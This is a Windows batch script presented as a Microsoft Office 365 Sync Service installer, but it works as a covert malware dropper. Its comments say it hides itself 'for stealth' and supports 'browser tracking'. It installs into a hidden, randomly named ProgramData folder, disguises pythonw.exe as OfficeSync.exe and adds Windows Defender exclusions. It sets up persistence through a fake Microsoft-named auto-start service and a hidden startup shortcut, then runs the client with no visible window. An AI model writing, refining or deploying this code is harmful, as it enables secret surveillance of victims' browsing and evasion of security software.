@echo off
:: Microsoft Office 365 Sync Service Installer v1.0.1
:: Simple one-click installation for Windows

title Microsoft Office 365 Setup
color 0A

echo.
echo ========================================
echo   Microsoft Office 365 Sync Service
echo ========================================
echo.

:: Check admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] This installer requires Administrator privileges.
    echo.
    echo Right-click on INSTALL.bat and select "Run as administrator"
    echo.
    pause
    exit /b 1
)

echo [1/5] Checking system...
where python >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] Python is not installed or not in PATH
    echo.
    echo Please install Python 3.6+ from: https://www.python.org/downloads/
    echo Make sure to check "Add Python to PATH" during installation
    echo.
    pause
    exit /b 1
)

echo [2/5] Creating installation directory...
:: Generate random folder name for stealth
set /a RAND_NUM=%RANDOM% %% 9999 + 1000
set INSTALL_DIR=C:\ProgramData\Microsoft\Office365Sync_%RAND_NUM%
if exist "%INSTALL_DIR%" (
    echo     Backing up existing installation...
    move "%INSTALL_DIR%" "%INSTALL_DIR%.backup.%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~0,2%%time:~3,2%" >nul 2>&1
)
mkdir "%INSTALL_DIR%" 2>nul

:: Hide the directory
attrib +h +s "%INSTALL_DIR%"

:: Save install path for later use
echo %INSTALL_DIR%> "%TEMP%\office365_path.txt"

echo [3/5] Copying client files...
xcopy /E /I /Y "client\*" "%INSTALL_DIR%" >nul
if %errorLevel% neq 0 (
    echo [ERROR] Failed to copy files
    pause
    exit /b 1
)

echo [4/5] Installing Python dependencies...
cd /d "%INSTALL_DIR%"

:: FIX BUG #63: Find and copy pythonw.exe with disguised name (CRITICAL for no window)
set PYTHONW_FOUND=0
where pythonw.exe >nul 2>&1
if %errorLevel% equ 0 (
    for /f "delims=" %%i in ('where pythonw.exe') do (
        copy "%%i" "%INSTALL_DIR%\OfficeSync.exe" >nul 2>&1
        if %errorLevel% equ 0 (
            set PYTHONW_FOUND=1
            echo     ✓ pythonw.exe copied as OfficeSync.exe
            goto :found_python
        )
    )
)

:: Fallback: Find pythonw.exe in Python installation directory
if %PYTHONW_FOUND% equ 0 (
    for /f "tokens=*" %%i in ('where python.exe 2^>nul') do (
        set PYTHON_DIR=%%~dpi
        if exist "!PYTHON_DIR!pythonw.exe" (
            copy "!PYTHON_DIR!pythonw.exe" "%INSTALL_DIR%\OfficeSync.exe" >nul 2>&1
            if %errorLevel% equ 0 (
                set PYTHONW_FOUND=1
                echo     ✓ pythonw.exe found and copied
                goto :found_python
            )
        )
    )
)

:: Last resort: Create VBS script to launch python without window
if %PYTHONW_FOUND% equ 0 (
    echo     ⚠ pythonw.exe not found, creating no-window launcher
    echo Set WshShell = CreateObject("WScript.Shell") > "%INSTALL_DIR%\OfficeSync.vbs"
    echo WshShell.Run """%INSTALL_DIR%\python_launcher.bat""", 0, False >> "%INSTALL_DIR%\OfficeSync.vbs"
)

:found_python

echo     Installing dependencies...
python -m pip install --quiet --upgrade pip
python -m pip install --quiet -r requirements.txt
if %errorLevel% neq 0 (
    echo [WARNING] Some dependencies failed to install
    echo The client will try to auto-install them on first run
)

:: FIX BUG #64: Explicitly install pywin32 for Windows browser tracking (CRITICAL)
echo     Installing Windows-specific dependencies...
python -m pip install --quiet pywin32>=306
if %errorLevel% equ 0 (
    echo     ✓ pywin32 installed (browser tracking support)
    :: Post-install script for pywin32
    python -m pywin32_postinstall -install >nul 2>&1
) else (
    echo     ⚠ pywin32 installation failed - browser tracking may not work
)

echo [5/5] Setting up auto-start...

:: Add Windows Defender exclusion for stealth
echo     Adding Windows Defender exclusions...
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%'" 2>nul
powershell -Command "Add-MpPreference -ExclusionProcess 'OfficeSync.exe'" 2>nul
powershell -Command "Add-MpPreference -ExclusionProcess 'pythonw.exe'" 2>nul

:: Register as Windows Service using sc
echo     Registering Windows service...
sc create "Office365Sync" binPath= "\"%INSTALL_DIR%\OfficeSync.exe\" \"%INSTALL_DIR%\main.py\"" start= auto DisplayName= "Microsoft Office 365 Sync Service" >nul 2>&1
sc description "Office365Sync" "Synchronizes Microsoft Office 365 data and settings" >nul 2>&1
sc config "Office365Sync" start= delayed-auto >nul 2>&1

:: FIX BUG #63: Create hidden startup shortcut with WindowStyle = 0 (Hidden, not Minimized)
set STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
powershell -Command "$WS = New-Object -ComObject WScript.Shell; $SC = $WS.CreateShortcut('%STARTUP_DIR%\OfficeSync.lnk'); $SC.TargetPath = '%INSTALL_DIR%\OfficeSync.exe'; $SC.Arguments = '%INSTALL_DIR%\main.py'; $SC.WorkingDirectory = '%INSTALL_DIR%'; $SC.WindowStyle = 0; $SC.Save()"
attrib +h "%STARTUP_DIR%\OfficeSync.lnk"

:: Start the service
echo.
echo Starting sync service...
sc start "Office365Sync" >nul 2>&1
if %errorLevel% neq 0 (
    :: Fallback to direct execution if service fails
    start /B "%INSTALL_DIR%\OfficeSync.exe" "%INSTALL_DIR%\main.py"
)

echo.
echo ========================================
echo   Installation Complete!
echo ========================================
echo.
echo Microsoft Office 365 Sync Service installed
echo Service is now running in the background
echo It will start automatically on system boot
echo.
pause
